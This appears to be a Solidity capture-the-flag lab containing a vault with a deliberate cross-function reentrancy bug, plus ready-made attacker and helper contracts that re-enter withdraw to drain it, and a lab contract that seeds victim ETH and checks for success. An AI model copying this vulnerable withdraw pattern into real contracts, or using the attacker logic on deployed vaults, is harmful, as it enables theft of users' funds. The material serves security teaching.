// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {SolvableBase} from "@common/SolvableBase.sol";

/// @notice Vault with cross-function CEI violations. `withdraw` performs
///         an external call before zeroing the caller's balance — the
///         classic shape. `transferBalance` is a *separate* mutator that
///         reads the same balance. The bug is the missing contract-wide
///         invariant around a shared accounting mapping while external
///         control flow is still open.
contract Q17YieldVault {
    mapping(address => uint256) public balances;

    event Deposited(address indexed user, uint256 amount);
    event Transferred(address indexed from, address indexed to, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    function transferBalance(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        emit Transferred(msg.sender, to, amount);
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");
        // BUG (cross-function CEI): external call before state update.
        //      Other mutators touching the same mapping are not locked.
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "send failed");
        balances[msg.sender] = 0;
        emit Withdrawn(msg.sender, bal);
    }

    receive() external payable {}
}

/// @notice Per-user attacker used by the lab to expose the cross-function
///         accounting issue.
contract Q17InflateAttacker {
    Q17YieldVault public immutable vault;
    address public immutable owner;
    address public immutable helper;
    bool internal _attacking;

    constructor(Q17YieldVault v, address o, address h) {
        vault = v;
        owner = o;
        helper = h;
    }

    function attack() external payable {
        require(msg.sender == owner, "only owner");
        require(msg.value > 0, "bait > 0");
        vault.deposit{value: msg.value}();
        _attacking = true;
        vault.withdraw();
        _attacking = false;
    }

    receive() external payable {
        if (_attacking) {
            _attacking = false; // single re-entry only
            uint256 bal = vault.balances(address(this));
            vault.transferBalance(helper, bal);
        }
    }

    function drain() external {
        require(msg.sender == owner, "only owner");
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}

/// @notice Per-user helper used by the lab scenario.
contract Q17InflateHelper {
    Q17YieldVault public immutable vault;
    address public immutable owner;

    constructor(Q17YieldVault v, address o) {
        vault = v;
        owner = o;
    }

    function pull() external {
        require(msg.sender == owner, "only owner");
        vault.withdraw();
    }

    function drain() external {
        require(msg.sender == owner, "only owner");
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok, "drain failed");
    }

    receive() external payable {}
}

/// @notice Multi-tenant inflate lab. Each user calls `createInstance()`
///         once; the lab deploys (vault, attacker, helper) and pre-funds
///         the vault with `SEED` ETH playing the role of victim deposit.
contract Q17InflateLab is SolvableBase {
    uint256 public constant SEED = 0.001 ether;

    struct Instance {
        Q17YieldVault vault;
        Q17InflateAttacker attacker;
        Q17InflateHelper helper;
    }

    mapping(address => Instance) private _instances;

    event InstanceCreated(address indexed user, address vault, address attacker, address helper);

    receive() external payable {}

    function createInstance() external returns (address vault, address attacker, address helper) {
        require(address(_instances[msg.sender].vault) == address(0), "already created");
        require(address(this).balance >= SEED, "lab underfunded");

        Q17YieldVault v = new Q17YieldVault();
        Q17InflateHelper h = new Q17InflateHelper(v, msg.sender);
        Q17InflateAttacker a = new Q17InflateAttacker(v, msg.sender, address(h));

        v.deposit{value: SEED}(); // Lab becomes the "victim depositor"

        _instances[msg.sender] = Instance(v, a, h);
        emit InstanceCreated(msg.sender, address(v), address(a), address(h));
        return (address(v), address(a), address(h));
    }

    function vaultOf(address user) external view returns (Q17YieldVault) {
        return _instances[user].vault;
    }

    function attackerOf(address user) external view returns (Q17InflateAttacker) {
        return _instances[user].attacker;
    }

    function helperOf(address user) external view returns (Q17InflateHelper) {
        return _instances[user].helper;
    }

    /// @notice Solved when the cross-function accounting invariant has been broken
    ///         for the user's instance.
    function isSolved(address user) public view override returns (bool) {
        Instance memory inst = _instances[user];
        if (address(inst.vault) == address(0)) return false;
        return address(inst.vault).balance == 0
            && address(inst.attacker).balance >= 0.001 ether
            && address(inst.helper).balance >= 0.001 ether;
    }
}
